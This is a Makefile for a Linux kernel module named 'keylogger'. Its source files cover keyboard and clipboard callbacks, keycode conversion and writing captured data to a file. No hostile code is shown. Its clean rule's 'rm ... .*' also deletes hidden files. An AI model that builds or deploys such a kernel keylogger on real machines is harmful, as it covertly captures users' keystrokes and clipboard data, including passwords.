obj-m := keylogger.o

# Lista fișierelor sursă pentru modul
keylogger-objs :=init.o keyboard_callback.o write_to_file.o keycode_to_string.o flush.o clipboard_callback.o write_to_file_clipboard.o flush_clipboard.o

COMPILE_DIR := $(PWD)
KDIR := /lib/modules/$(shell uname -r)/build

all:
	$(MAKE) -C $(KDIR) M=$(COMPILE_DIR) modules

clean:
	rm -f -v *.o *.ko *.mod *.cmd *.symvers *.markers .* keylogger.mod.c modules.order
